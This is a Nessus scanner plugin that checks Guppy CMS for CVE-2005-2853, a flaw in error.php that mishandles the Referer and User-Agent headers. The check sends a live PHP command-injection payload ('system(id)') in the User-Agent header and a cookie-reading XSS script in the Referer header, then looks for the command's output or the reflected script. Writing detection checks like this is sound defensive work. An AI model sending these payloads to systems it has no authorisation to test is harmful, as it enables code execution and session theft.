#
# Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (4/30/09)
# - Fixed typo (5/21/14)

include("compat.inc");

if (description) {
  script_id(19943);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2015/01/23 22:03:55 $");

  script_cve_id("CVE-2005-2853");
  script_bugtraq_id(14753);
  script_osvdb_id(19243);

  script_name(english:"Guppy Multiple HTTP Header XSS");
  script_summary(english:"Checks for request header injection vulnerabilities in Guppy");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows for
arbitrary code execution and cross-site scripting attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Guppy, a CMS written in PHP.

The remote version of this software does not properly sanitize input
to the Referer and User-Agent HTTP headers before using it in the
'error.php' script.  A malicious user can exploit this flaw to inject
arbitrary script and HTML code into a user's browser or, if PHP's
'magic_quotes_gpc' seting is disabled, PHP code to be executed on the
remote host subject to the privileges of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.vupen.com/english/advisories/2005/1639");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Guppy version 4.5.4 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"plugin_publication_date", value:"2005/10/06");
  script_set_attribute(attribute:"vuln_publication_date", value:"2005/09/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");
  script_copyright(english:"(C) 2005-2015 Josh Zlatin-Amishav");
  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# A simple alert.
xss = "<script>alert(document.cookie);</script>";

# Loop through CGI directories.
foreach dir (cgi_dirs()) 
{
  # Try to exploit the flaw.
  req = string(
    "GET ", dir, "/error.php?err=404 HTTP/1.1\r\n",
    # nb: try to execute id.
    "User-Agent: ", '"; system(id);#', "\r\n",
    #     and try to inject some JavaScript.
    "Referer: ", xss, "\r\n",
    "Host: ", get_host_name(), "\r\n",
    "\r\n"
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  # We need to follow the 302 redirection
  pat = "location: (.+)";
  matches = egrep(string:res, pattern:pat);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      url = eregmatch(string:match, pattern:pat);
      if (url == NULL) break;
      url = url[1];
      debug_print("url[", url, "]\n");
      break;
    }
  }

  if (url) {
    req = http_get(item:string(dir, "/", url), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # Get results of id command.
    pat = "^(uid=[0-9]+.*gid=[0-9]+.*)";
    matches = egrep(string:res, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        idres = eregmatch(string:match, pattern:pat);
        if (idres == NULL) break;
        idres = idres[1];
        debug_print("idres[", idres, "]\n");
        break;
      }
    }

    # Check for the results of the id command.
    if (idres)
    {
      report = string(
        "\n",
        "The following is the output received from the 'id' command:\n", 
        "\n",
        idres,
        "\n"
      );

      security_warning(port:port, extra:report);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
    # Check for XSS.
    else if (xss >< res && !get_kb_item("www/"+port+"/generic_xss"))
    {
      security_warning(port);
      set_kb_item(name:'www/'+port+'/XSS', value:TRUE);
      exit(0);
    }
  }
}
